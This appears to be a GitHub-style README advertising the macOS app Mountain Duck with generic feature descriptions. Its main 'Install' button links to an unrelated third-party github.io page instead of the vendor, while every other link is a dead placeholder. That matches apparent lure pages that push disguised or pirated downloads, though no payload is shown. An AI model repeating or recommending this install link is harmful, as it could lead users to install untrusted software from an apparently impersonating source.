# Mountain Duck OSX

<p align="center">
  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/ed/e3/68/ede36830-6264-7e73-083b-018636318eab/application-0-0-85-220-0-0-6-0-2x-0-0-0.png/1200x630bb.png" width="200" alt="Mountain Duck icon"/>
</p>

<p align="center">

[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://samara-apes.github.io/.github/mountainduck)

</p>

<p align="center">
  <img src="https://cdn.mountainduck.io/images/mountainduck_macos.png" alt="Mountain Duck screenshot"/>
</p>

---

## Overview

Working with files on remote servers and cloud storage typically requires either a dedicated sync client that copies everything locally, a web browser interface that lacks native application integration, or a command-line tool that excludes non-technical users. <a href="#">Mountain Duck</a> offers a fundamentally different approach: mounting remote storage as genuine local drives in macOS Finder, making files on <a href="#">Amazon S3</a>, SFTP servers, WebDAV hosts, Google Drive, Dropbox, OneDrive, and dozens of other protocols accessible exactly as if they were sitting on a locally attached volume.

The drive mounting approach changes how remote files are used in practice. Any application on the Mac can open a file from a Mountain Duck-mounted drive directly through the standard open dialog, edit it in place, and save it back to the remote location — no manual download, no upload step, no version reconciliation. A designer working on assets stored in an S3 bucket edits PSD files in Photoshop; a developer edits configuration files on a remote Linux server directly in their preferred code editor; a team member opens and annotates a PDF stored in shared cloud storage from Preview. The <a href="#">Finder integration</a> is complete — files appear with correct sizes and modification dates, folders can be browsed and navigated, and drag-and-drop operations work between local and remote locations.

<a href="#">Sync favourites</a> allow specific files or folders to be designated for offline availability, downloaded to a local cache that remains accessible when the remote connection is unavailable. This transforms Mountain Duck from a purely online tool into one that accommodates travel and unreliable connectivity, with changes made offline synchronised back to the remote storage when the connection is restored. The <a href="#">menu bar interface</a> manages all active and saved connections from a single accessible location, showing connection status, active transfers, and recent items without requiring the Mountain Duck application window to be open. Support for <a href="#">cryptomator vaults</a> allows client-side encryption to be applied to cloud storage destinations, ensuring that files stored in shared or third-party cloud infrastructure are encrypted before they leave the Mac, maintaining data privacy regardless of the security posture of the remote storage provider.

---

## Key Features

- Native <a href="#">Finder integration</a> mounting remote storage as local drives
- Support for <a href="#">Amazon S3</a>, SFTP, WebDAV, FTP, and Google Drive
- <a href="#">Azure Blob Storage</a>, Backblaze B2, Dropbox, and OneDrive connectivity
- Sync <a href="#">favourites</a> for offline access to designated files and folders
- <a href="#">Menu bar</a> interface for connection management and transfer monitoring
- Cryptomator <a href="#">vault integration</a> for client-side encryption of remote files
- In-place <a href="#">file editing</a> from any Mac application without downloading
- <a href="#">Transfer panel</a> with progress tracking and history for large operations
- Saved <a href="#">connection profiles</a> with automatic reconnection and authentication

---

<p align="center">
  <img src="https://blog.cyberduck.io/wp-content/uploads/2025/07/Mountain-Duck-S3-Connection-Integrated-Connect-Mode-macOS.png" alt="Mountain Duck screenshot"/>
</p>

---

## Additional Information

Mountain Duck's core value is the elimination of the workflow friction that remote file access normally creates. By presenting remote storage through native Finder integration, it removes the layer of consciousness that file location normally demands — files on a remote server behave identically to local files from the perspective of every application on the Mac.

The breadth of protocol support is genuinely useful in professional environments where different storage types coexist. Supporting S3-compatible object storage, SFTP servers, WebDAV, and major cloud platforms through a single tool with a consistent interface reduces the collection of separate clients and tools that remote file management otherwise requires.

Cryptomator vault support addresses a real concern about cloud storage privacy. Files encrypted client-side before upload ensure that the storage provider has no access to content regardless of their own security practices or potential data access requests, which is particularly important for sensitive professional or personal data.

---
